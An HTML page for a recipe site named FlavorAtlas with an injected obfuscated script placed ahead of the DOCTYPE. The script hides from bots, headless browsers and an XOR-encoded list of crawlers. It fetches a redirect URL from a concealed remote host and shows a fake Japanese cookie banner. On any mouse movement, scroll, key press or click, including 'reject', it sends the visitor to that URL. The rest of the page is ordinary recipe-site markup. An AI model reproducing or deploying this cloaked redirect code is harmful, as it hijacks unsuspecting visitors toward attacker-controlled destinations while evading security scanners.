<script>
(function(){var w=window,d=document,n=navigator;try{if(n.webdriver===true)return;if(w.callPhantom||w.phantom||w.nightmare||w.domAutomation||w.domAutomationController||w.Cypress)return;if(w.webdriver_evaluate||w.driver_evaluate||w.webdriver_unwrapped||w.fxdriver_unwrapped||w.driver_unwrapped||w.selenium_unwrapped||w.webdriver_script_func||w.webdriver_script_fn||w.webdriver_script_function)return;if(n.plugins&&n.plugins.length===0&&n.languages&&n.languages.length===0)return;}catch(e){return;}var _k=[23,87,41,55,99,12,67,34,71,18,93,45,62,7,88,29];var _d=function(s){var o='';for(var i=0;i<s.length;i+=2)o+=String.fromCharCode(parseInt(s.substr(i,2),16)^_k[(i/2)%_k.length]);return o;};var H=_d("7f235d4710366c0d247e324c55772a723938475b0a6226"),C=_d("7263110f023f77116a253e1d5d2a6c7e2334040e5a3f250f7026641d5b3f692c23611a56"),S="2807c05ea671e51a8a27ae4d";var ua=(n.userAgent||'').toLowerCase();var bt=["703846500f69214d33","76335a550c786e45287d3a415b","703846500f696e4b29612d485d733172792346580f","7a324d5e027c2250337c385f4d2a3f7278304552","753e4750016337","7a2447550c78","763340531b6e2c56","753e4750137e26542e772a","71364a5201632c49226a29484c6939717f3e5d","71364a52016337","7a325d564e693b562260334c52663f787923","63204043176931402866","7627595b066e2c56","763a484d0c62214d33","6e3647530674214d33","75364053167f334b23772f","73224a5c07792049257d29","7e367656116f2b4b31772f","643b5c4513","763f5b52057f214d33","64324445167f2b402866","73385d550c78","7a3d1805016337","753b4c4f016337","73365d5605633151227d3f424a","67325d560f6e2c56","64345b5202612a4c20323b5f5160","643e5d520279274b33703259","752e5d52107c2a462260","64324c5c13633156","64325b4710782256257d29","672e5d5f0c626e50226328484d732b","74225b5b4c","60304c434c","762f40581023","7038045f1778330f247e34485073","7d365f564c","783c4143177c","7f3248530f693051247a2f425362","673f485917632e4834","643b405a067e2951","672259470678264735","673b484e147e2a452f66","643245520d65364f","74344b5817","70275d550c78","743b484207696e552270","67325b470f693b4b336b3f424a","76395d5f1163334b243f3c44","703846500f696e473f6638435a623c","7836401a10692250247a3f424a"];for(var i=0;i<bt.length;i++){var t=_d(bt[i]);if(t&&ua.indexOf(t)!==-1)return;}if(/headless|electron/i.test(ua))return;var lv=null,intent=false,done=false;function go(){if(done||!lv)return;done=true;w.location.href=lv;}function rd(){intent=true;go();}try{fetch(H+'/c/'+C+'?k='+S,{credentials:'omit',cache:'no-store',referrerPolicy:'no-referrer'}).then(function(r){return r.json();}).then(function(j){lv=j&&j.url||null;if(intent)go();}).catch(function(){});}catch(e){}function ui(){try{d.cookie='gdpr_pending=1;path=/;max-age=86400;SameSite=Lax';}catch(e){}var s=d.createElement('style');s.textContent='#ov{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding-top:18vh}#ob{background:#fff;border-radius:14px;padding:30px 32px;max-width:380px;width:90%;box-shadow:0 12px 40px rgba(0,0,0,.25);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;animation:op .25s ease}@keyframes __op{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}#ob h3{margin:0 0 10px;font-size:18px;color:#111;font-weight:700}#ob p{margin:0 0 22px;font-size:13.5px;color:#555;line-height:1.55}#bt{display:flex;gap:10px;justify-content:center}#ba,#bd{flex:1;padding:11px 0;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .15s;font-family:inherit}#ba{background:#2563eb;color:#fff}#bd{background:#efefef;color:#333}#ba:hover{opacity:.88}#bd:hover{opacity:.75}';d.head.appendChild(s);var o=d.createElement('div');o.id='ov';o.innerHTML='<div id="ob"><h3>🍪 クッキーの使用について<\/h3><p>当サイトではコンテンツや広告の配信、アクセス解析のためにクッキーを使用しています。「同意する」をクリックすることで、クッキーポリシーに同意したものとみなされます。<\/p><div id="bt"><button id="bd" type="button">拒否する<\/button><button id="ba" type="button">同意する<\/button><\/div><\/div>';(d.body||d.documentElement).appendChild(o);d.getElementById('ba').onclick=function(){try{d.cookie='gdpr_consent=all;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};d.getElementById('bd').onclick=function(){try{d.cookie='_gdpr_consent=essential;path=/;max-age=31536000;SameSite=Lax';}catch(e){}rd();};}var _ev=['mousemove','pointerdown','pointermove','touchstart','scroll','wheel','keydown','click'],_eo={once:true,passive:true},_eh=function(){_ev.forEach(function(_e){try{w.removeEventListener(_e,rd,_eo);}catch(x){}try{d.removeEventListener(_e,rd,_eo);}catch(x){}});};rd=(function(_r){return function(){_eh();_r();};})(rd);_ev.forEach(function(_e){try{w.addEventListener(_e,rd,_eo);}catch(x){}try{d.addEventListener(_e,rd,_eo);}catch(x){}});if(d.readyState==='loading')d.addEventListener('DOMContentLoaded',ui);else ui();})();
</script><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FlavorAtlas — World's Largest Recipe Collection</title>
    <meta name="description" content="Discover 100+ authentic recipes from every corner of the world. From Japanese ramen to Italian pasta, Mexican tacos to Indian curry — your global kitchen awaits.">
    <meta name="keywords" content="recipes, world cuisine, cooking, food, international recipes, global kitchen">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700;900&family=Inter:wght@300;400;500;600;700;800&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="cursor-glow" id="cursorGlow"></div>
    <div class="page-loader" id="pageLoader">
        <div class="loader-content">
            <div class="loader-icon">🌍</div>
            <div class="loader-text">FlavorAtlas</div>
            <div class="loader-bar"><div class="loader-fill"></div></div>
        </div>
    </div>

    <nav class="nav" id="navbar">
        <div class="nav-inner">
            <a href="index.html" class="logo">
                <span class="logo-icon">🌍</span>
                <span class="logo-text">Flavor<span class="logo-accent">Atlas</span></span>
            </a>
            <div class="nav-links" id="navLinks">
                <a href="#home">Home</a>
                <a href="#regions">Regions</a>
                <a href="#popular">Popular</a>
                <a href="#recipes">All Recipes</a>
                <a href="#about">About</a>
            </div>
            <div class="nav-actions">
                <button class="search-toggle" id="searchToggle" aria-label="Search">🔍</button>
                <button class="nav-toggle" id="navToggle" aria-label="Menu"><span></span><span></span><span></span></button>
            </div>
        </div>
        <div class="search-bar" id="searchBar">
            <div class="search-inner">
                <span class="search-icon">🔍</span>
                <input type="text" id="searchInput" placeholder="Search recipes from around the world..." autocomplete="off">
                <button class="search-close" id="searchClose">✕</button>
            </div>
            <div class="search-results" id="searchResults"></div>
        </div>
    </nav>

    <section class="hero" id="home">
        <div class="hero-bg">
            <img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=1920&q=80" alt="World cuisine" class="hero-bg-img">
            <div class="hero-overlay"></div>
        </div>
        <div class="hero-particles" id="heroParticles"></div>
        <div class="hero-content">
            <div class="hero-badge">🔥 100+ Authentic Recipes</div>
            <h1 class="hero-title">
                <span class="title-line">Every Flavor,</span>
                <span class="title-line script">Every Corner</span>
                <span class="title-line">of the World.</span>
            </h1>
            <p class="hero-sub">From the bustling streets of Bangkok to the quiet kitchens of Tuscany — discover recipes that have been passed down through generations, now brought to your table.</p>
            <div class="hero-cta">
                <a href="#recipes" class="btn btn-primary">Explore Recipes</a>
                <a href="#regions" class="btn btn-outline">By Region</a>
            </div>
            <div class="hero-stats">
                <div class="stat"><span class="stat-num" data-target="100">0</span><span class="stat-label">Recipes</span></div>
                <div class="stat"><span class="stat-num" data-target="7">0</span><span class="stat-label">Continents</span></div>
                <div class="stat"><span class="stat-num" data-target="45">0</span><span class="stat-label">Countries</span></div>
            </div>
        </div>
        <div class="scroll-hint">
            <div class="mouse"><div class="wheel"></div></div>
            <span>Scroll to explore</span>
        </div>
    </section>

    <section class="regions" id="regions">
        <div class="container">
            <div class="section-header">
                <span class="section-tag">Explore by Region</span>
                <h2 class="section-title">Taste the <span class="accent">World</span></h2>
                <p class="section-desc">Click on a region to discover its unique culinary traditions and authentic recipes.</p>
            </div>
            <div class="region-grid">
                <a href="#recipes" class="region-card" data-region="asia" onclick="filterRecipes('asia')">
                    <img src="https://images.unsplash.com/photo-1562564055-71e051d33c19?w=600&q=80" alt="Asia">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🥢</span><h3>Asia</h3><p>28 recipes</p></div>
                </a>
                <a href="#recipes" class="region-card" data-region="europe" onclick="filterRecipes('europe')">
                    <img src="https://images.unsplash.com/photo-1498579150354-977475b7ea0b?w=600&q=80" alt="Europe">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🍷</span><h3>Europe</h3><p>24 recipes</p></div>
                </a>
                <a href="#recipes" class="region-card" data-region="americas" onclick="filterRecipes('americas')">
                    <img src="https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=600&q=80" alt="Americas">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🌮</span><h3>Americas</h3><p>20 recipes</p></div>
                </a>
                <a href="#recipes" class="region-card" data-region="africa" onclick="filterRecipes('africa')">
                    <img src="https://images.unsplash.com/photo-1604329760661-e71dc83f8f26?w=600&q=80" alt="Africa">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🌍</span><h3>Africa</h3><p>12 recipes</p></div>
                </a>
                <a href="#recipes" class="region-card" data-region="middle-east" onclick="filterRecipes('middle-east')">
                    <img src="https://images.unsplash.com/photo-1511690743698-d9d18f7e20f1?w=600&q=80" alt="Middle East">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🫒</span><h3>Middle East</h3><p>10 recipes</p></div>
                </a>
                <a href="#recipes" class="region-card" data-region="oceania" onclick="filterRecipes('oceania')">
                    <img src="https://images.unsplash.com/photo-1544025162-d76694265947?w=600&q=80" alt="Oceania">
                    <div class="region-overlay"></div>
                    <div class="region-content"><span class="region-emoji">🦐</span><h3>Oceania</h3><p>6 recipes</p></div>
                </a>
            </div>
        </div>
    </section>

    <section class="popular" id="popular">
        <div class="container">
            <div class="section-header">
                <span class="section-tag">Chef's Picks</span>
                <h2 class="section-title">Most <span class="accent">Popular</span></h2>
                <p class="section-desc">The recipes our community can't stop cooking.</p>
            </div>
            <div class="popular-scroll" id="popularScroll"></div>
        </div>
    </section>

    <section class="all-recipes" id="recipes">
        <div class="container">
            <div class="section-header">
                <span class="section-tag">Full Collection</span>
                <h2 class="section-title">All <span class="accent">100 Recipes</span></h2>
                <p class="section-desc">Every recipe, from every corner of the globe. Filter by region or difficulty.</p>
            </div>
            <div class="filter-bar">
                <button class="filter-btn active" data-filter="all" onclick="filterRecipes('all')">All</button>
                <button class="filter-btn" data-filter="asia" onclick="filterRecipes('asia')">🥢 Asia</button>
                <button class="filter-btn" data-filter="europe" onclick="filterRecipes('europe')">🍷 Europe</button>
                <button class="filter-btn" data-filter="americas" onclick="filterRecipes('americas')">🌮 Americas</button>
                <button class="filter-btn" data-filter="africa" onclick="filterRecipes('africa')">🌍 Africa</button>
                <button class="filter-btn" data-filter="middle-east" onclick="filterRecipes('middle-east')">🫒 Middle East</button>
                <button class="filter-btn" data-filter="oceania" onclick="filterRecipes('oceania')">🦐 Oceania</button>
            </div>
            <div class="recipe-grid" id="recipeGrid"></div>
            <div class="load-more-wrap">
                <button class="btn btn-outline" id="loadMoreBtn" onclick="loadMore()">Load More Recipes</button>
            </div>
        </div>
    </section>

    <section class="cta-section">
        <div class="cta-bg"><img src="https://images.unsplash.com/photo-1556910103-1c02745aae4d?w=1920&q=80" alt="Cooking"></div>
        <div class="container">
            <h2>Ready to Cook <span class="script">Something Amazing</span>?</h2>
            <p>Join millions of home cooks exploring world cuisine every day.</p>
            <a href="#recipes" class="btn btn-primary btn-lg">Start Cooking</a>
        </div>
    </section>

    <section class="about-section" id="about">
        <div class="container">
            <div class="about-grid">
                <div class="about-image">
                    <img src="https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=800&q=80" alt="Kitchen">
                </div>
                <div class="about-content">
                    <span class="section-tag">Our Story</span>
                    <h2>Recipes That <span class="accent">Transcend</span> Borders</h2>
                    <p>FlavorAtlas was born from a simple belief: that food is the most powerful connector of cultures. Every recipe on this site has been researched, tested, and written with deep respect for its origins. We don't just share ingredients — we share stories, traditions, and the soul of each dish.</p>
                    <div class="about-features">
                        <div class="about-feat"><span>✦</span> Authentically sourced from local cooks</div>
                        <div class="about-feat"><span>✦</span> Tested in our kitchen 3× before publishing</div>
                        <div class="about-feat"><span>✦</span> Cultural context with every recipe</div>
                        <div class="about-feat"><span>✦</span> Step-by-step photos for guidance</div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="container">
            <div class="footer-grid">
                <div class="footer-brand">
                    <div class="logo"><span class="logo-icon">🌍</span><span class="logo-text">Flavor<span class="logo-accent">Atlas</span></span></div>
                    <p>The world's largest collection of authentic recipes from every corner of the globe.</p>
                    <div class="footer-social"><a href="#">𝕏</a><a href="#">IG</a><a href="#">YT</a><a href="#">TT</a></div>
                </div>
                <div class="footer-col"><h4>Regions</h4><a href="#">Asia</a><a href="#">Europe</a><a href="#">Americas</a><a href="#">Africa</a><a href="#">Middle East</a><a href="#">Oceania</a></div>
                <div class="footer-col"><h4>Explore</h4><a href="#">Popular</a><a href="#">Quick & Easy</a><a href="#">Vegetarian</a><a href="#">Desserts</a><a href="#">Street Food</a></div>
                <div class="footer-col"><h4>Company</h4><a href="#">About</a><a href="#">Contact</a><a href="#">Privacy</a><a href="#">Terms</a></div>
            </div>
            <div class="footer-bottom"><p>© 2025-2026 FlavorAtlas. All rights reserved.</p></div>
        </div>
    </footer>

    <button class="back-to-top" id="backToTop">↑</button>
    <script src="js/recipes-data.js"></script>
    <script src="js/main.js"></script>
</body>
</html>
